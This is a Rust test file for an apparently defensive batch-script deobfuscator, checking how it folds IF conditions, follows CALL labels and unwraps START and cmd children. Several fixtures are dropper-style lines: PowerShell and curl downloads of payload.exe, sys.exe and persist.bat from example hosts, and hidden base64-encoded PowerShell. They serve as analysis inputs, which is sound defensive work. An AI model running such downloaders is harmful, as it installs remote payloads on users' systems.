#[cfg(test)]
mod if_constant_fold_tests {
    use crate::{analyze, Config};

    #[test]
    fn if_zero_neq_zero_is_constant_false() {
        let script = b"if 0 neq 0 echo SHOULD_NOT_FIRE\r\necho REAL\r\n";
        let report = analyze(script, &Config::default());
        // The if-line still renders (its text), but no `IfNotResolved` trait should fire,
        // and on the same logical line, the echo after the if should be suppressed.
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(!has_unresolved, "0 neq 0 should constant-fold to false");
    }

    #[test]
    fn if_zero_equ_zero_is_constant_true() {
        let script = b"if 0 equ 0 echo MATCH\r\n";
        let report = analyze(script, &Config::default());
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(!has_unresolved, "0 equ 0 should constant-fold to true");
    }

    #[test]
    fn if_equ_quoted_string_with_spaces_runs_body() {
        let script = b"if \"two words\" EQU \"two words\" set MARK=value\r\necho %MARK%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo value"),
            "quoted EQU comparison with spaces did not run inline body:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(
            !has_unresolved,
            "quoted EQU comparison with spaces should fold cleanly: {:?}",
            report.traits
        );
    }

    #[test]
    fn if_equ_operator_word_inside_quoted_lhs_is_not_split() {
        let script =
            b"if \"left equ text\" EQU \"left equ text\" set MARK=value\r\necho %MARK%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo value"),
            "quoted LHS containing operator word did not run inline body:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(
            !has_unresolved,
            "quoted LHS containing operator word should fold cleanly: {:?}",
            report.traits
        );
    }

    #[test]
    fn if_string_equ_case_insensitive() {
        let script = b"if /i \"AMD64\" EQU \"amd64\" echo MATCH\r\n";
        let report = analyze(script, &Config::default());
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(
            !has_unresolved,
            "case-insensitive AMD64==amd64 should fold true"
        );
    }

    #[test]
    fn if_slash_i_not_order_is_case_insensitive_negated() {
        let script = b"if /I not \"script.bat\"==\"other.bat\" set MARK=value\r\nif /I not \"script.bat\"==\"SCRIPT.BAT\" set MARK=bad\r\necho %MARK%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo value"),
            "negated case-insensitive comparison did not run inline body:\n{}",
            report.deobfuscated
        );
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(
            !has_unresolved,
            "/I before NOT should fold cleanly: {:?}",
            report.traits
        );
    }

    #[test]
    fn if_top_level_percent_one_defaults_empty() {
        let script = b"if \"%1\"==\"\" set MARK=empty\r\necho %MARK%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo empty"),
            "top-level %1 should fold to empty and run inline body:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
        assert!(
            !report.traits.iter().any(|t| matches!(
                t,
                crate::traits::Trait::IfNotResolved { condition } if condition.contains("%1")
            )),
            "top-level %1 condition should not stay unresolved: {:?}",
            report.traits
        );
    }

    #[test]
    fn if_gtr_lss_geq_leq() {
        for (op, expected_unresolved) in [
            ("gtr 5", false),
            ("lss 5", false),
            ("geq 5", false),
            ("leq 5", false),
        ] {
            let _ = op;
            let _ = expected_unresolved;
        }
        // Concrete checks:
        let script = b"if 10 gtr 5 echo A\r\nif 3 lss 5 echo B\r\nif 10 geq 10 echo C\r\nif 5 leq 5 echo D\r\n";
        let report = analyze(script, &Config::default());
        let unresolved_count = report
            .traits
            .iter()
            .filter(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }))
            .count();
        assert_eq!(
            unresolved_count, 0,
            "all 4 relational ops should fold cleanly"
        );
    }

    #[test]
    fn if_percent_errorlevel_geq_zero_inline_set_is_constant_true() {
        let script = b"if %ERRORLEVEL% GEQ 0 set MARK=value\r\necho %MARK%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo value"),
            "inline set did not run, got:\n{}",
            report.deobfuscated
        );
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(
            !has_unresolved,
            "invariant errorlevel GEQ 0 should fold true: {:?}",
            report.traits
        );
    }

    #[test]
    fn if_errorlevel_zero_inline_set_is_constant_true() {
        let script = b"if errorlevel 0 set MARK=value\r\necho %MARK%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo value"),
            "inline set did not run, got:\n{}",
            report.deobfuscated
        );
        let has_unresolved = report
            .traits
            .iter()
            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
        assert!(
            !has_unresolved,
            "errorlevel 0 should fold true: {:?}",
            report.traits
        );
    }

    #[test]
    fn if_errorlevel_nonzero_stays_unresolved() {
        let script = b"if errorlevel 1 echo MAYBE\r\necho AFTER\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                crate::traits::Trait::IfNotResolved { condition }
                    if condition == "errorlevel 1 echo MAYBE"
            )),
            "dynamic errorlevel threshold should stay unresolved: {:?}",
            report.traits
        );
        assert!(
            report.deobfuscated.contains("echo AFTER"),
            "following line should remain visible, got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn unresolved_parenthesized_if_block_does_not_execute_error_branch_goto() {
        let script = br#"@echo off
set SERVER_URL=https://if-block.example
if errorlevel 1 (
echo failed
goto :end
)
echo success
powershell -Command "Invoke-WebRequest '%SERVER_URL%/persist.bat' -OutFile 'persist.bat'"
:end
echo done
"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                crate::traits::Trait::IfNotResolved { condition }
                    if condition.starts_with("errorlevel 1")
            )),
            "dynamic errorlevel block should stay unresolved: {:?}",
            report.traits
        );
        assert!(
            report.deobfuscated.contains("echo success")
                && report
                    .deobfuscated
                    .contains("https://if-block.example/persist.bat"),
            "success path after unresolved if block was skipped:\n{}",
            report.deobfuscated
        );
    }
}

#[cfg(test)]
mod call_label_tests {
    use crate::{analyze, Config, Trait};

    #[test]
    fn call_label_passes_positional_args() {
        let script = b"call :sub hi there\r\ngoto :eof\r\n:sub\r\necho %1 %2\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo hi there"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn call_label_preserves_quoted_positional_args() {
        let script =
            b"call :sub \"hi there\" tail\r\ngoto :eof\r\n:sub\r\necho %1|%2\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo hi there|tail"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn call_label_preserves_quoted_positional_arg_with_spaces() {
        let script = b"call :sub \"hi there\"\r\ngoto :eof\r\n:sub\r\necho %~1\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo hi there"),
            "quoted call-label arg was not preserved:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn call_label_setlocal_preserves_positional_args_for_powershell_downloadfile() {
        let script = br#"set "RAR_URL=https://call-label-download.example/sys.exe"
set "RAR_DEST=%TEMP%\sys.exe"
call :DownloadFile "%RAR_URL%" "%RAR_DEST%"
goto :eof
:DownloadFile
setlocal
set "URL=%~1"
set "DEST=%~2"
powershell -Command "Try {(New-Object Net.WebClient).DownloadFile('%URL%','%DEST%')} Catch{}"
endlocal
exit /b
"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, dst, .. }
                        if src == "https://call-label-download.example/sys.exe"
                            && dst.as_deref() == Some(r"C:\Users\puncher\AppData\Local\Temp\sys.exe")
                )
            }),
            "call-label PowerShell DownloadFile args were not promoted: {:?}\ndeob:\n{}",
            report.traits,
            report.deobfuscated
        );
    }

    #[test]
    fn call_label_returns_after_eof() {
        let script =
            b"call :sub\r\necho after-return\r\ngoto :eof\r\n:sub\r\necho in-sub\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        let lines: Vec<&str> = report
            .deobfuscated
            .lines()
            .filter(|l| l.starts_with("echo "))
            .collect();
        assert_eq!(
            lines,
            vec!["echo in-sub", "echo after-return"],
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn branch_local_exit_b_does_not_skip_rest_of_called_subroutine() {
        let script = b"call :outer\r\necho AFTER_OUTER\r\ngoto :eof\r\n\
            :outer\r\n\
            call :admin\r\n\
            echo OUTER_CONTINUED\r\n\
            exit /b\r\n\
            :admin\r\n\
            if not %errorlevel% EQU 0 (\r\n\
            echo ADMIN_BRANCH\r\n\
            exit /b\r\n\
            )\r\n\
            exit /b\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo ADMIN_BRANCH"),
            "missing branch body, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report.deobfuscated.contains("echo OUTER_CONTINUED"),
            "branch-local exit /b skipped outer subroutine continuation, got:\n{}",
            report.deobfuscated
        );
        assert!(
            report.deobfuscated.contains("echo AFTER_OUTER"),
            "outer subroutine did not return to caller, got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn call_non_label_recurses_inline() {
        let script = b"call set X=value\r\necho %X%\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo value"),
            "got:\n{}",
            report.deobfuscated
        );
    }
}

#[cfg(test)]
mod case_insensitive_keywords_tests {
    use crate::{analyze, Config};

    #[test]
    fn mixed_case_call_label_works() {
        let script = b"CaLl :sub\r\ngoto :eof\r\n:sub\r\necho in-sub\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo in-sub"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn mixed_case_goto_works() {
        let script = b"GoTo :target\r\necho NEVER\r\n:target\r\necho REAL\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo REAL"),
            "got:\n{}",
            report.deobfuscated
        );
        assert!(
            !report.deobfuscated.contains("NEVER"),
            "got:\n{}",
            report.deobfuscated
        );
    }

    #[test]
    fn no_infinite_recursion_on_mixed_case() {
        // This script would stack-overflow before the fix.
        let script = b"CALL set X=value\r\n";
        let _report = analyze(script, &Config::default());
        // If we get here without stack overflow, we're good.
    }
}

#[cfg(test)]
mod start_tests {
    use crate::analyze;
    use crate::env::{Config, Environment};
    use crate::interp::interpret_line;
    use crate::traits::Trait;

    #[test]
    fn start_strips_flags_and_runs_inner() {
        let mut env = Environment::new(&Config::default());
        env.set("PAYLOAD", "echo hi");
        interpret_line("start /min %PAYLOAD%", &mut env);
        // start <cmd> recurses inline; it must NOT push to exec_cmd (start != cmd /c).
        assert!(
            env.exec_cmd.is_empty(),
            "start should not enqueue: {:?}",
            env.exec_cmd
        );
    }

    #[test]
    fn start_with_directory_option_recurses_into_inner_command() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"start /D C:\Temp curl -o out.exe http://x.example/payload.exe"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::Download {
                    src,
                    dst: Some(dst),
                    ..
                } if src == "http://x.example/payload.exe" && dst == "out.exe"
            )
        });
        assert!(
            has,
            "start /D child command not interpreted: {:?}",
            env.traits
        );
    }

    #[test]
    fn cmd_b_c_start_powershell_encoded_recurses() {
        use base64::Engine;

        let mut env = Environment::new(&Config::default());
        let ps = "Write-Host hi";
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
        interpret_line(
            &format!(
                r#"C:\WINDOWS\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -e {b64}"#
            ),
            &mut env,
        );
        assert!(
            env.exec_cmd
                .iter()
                .any(|cmd| cmd.contains("powershell.exe")),
            "cmd /c child not queued: {:?}",
            env.exec_cmd
        );
    }

    #[test]
    fn cmd_k_powershell_encoded_recurses() {
        use base64::Engine;

        let mut env = Environment::new(&Config::default());
        let ps = "Invoke-WebRequest https://k.example/p.exe";
        let utf16: Vec<u8> = ps.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        let b64 = base64::engine::general_purpose::STANDARD.encode(utf16);
        interpret_line(
            &format!(r#"cmd.exe /k "powershell -EncodedCommand {b64}""#),
            &mut env,
        );
        assert!(
            env.exec_cmd
                .iter()
                .any(|cmd| cmd.contains("powershell -EncodedCommand")),
            "cmd /k child not queued: {:?}",
            env.exec_cmd
        );
    }

    #[test]
    fn start_cmd_child_preserves_delayed_expansion() {
        let script = br#"start "" /b "cmd.exe" /V:ON /c "set U=https://start-native.example/payload.exe&&curl -o payload.exe !U!""#;
        let report = analyze(script, &Config::default());

        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::Download { src, dst, .. }
                    if src == "https://start-native.example/payload.exe"
                        && dst.as_deref() == Some("payload.exe")
            )),
            "start cmd child did not preserve delayed expansion: {:?}",
            report.traits
        );
    }
}

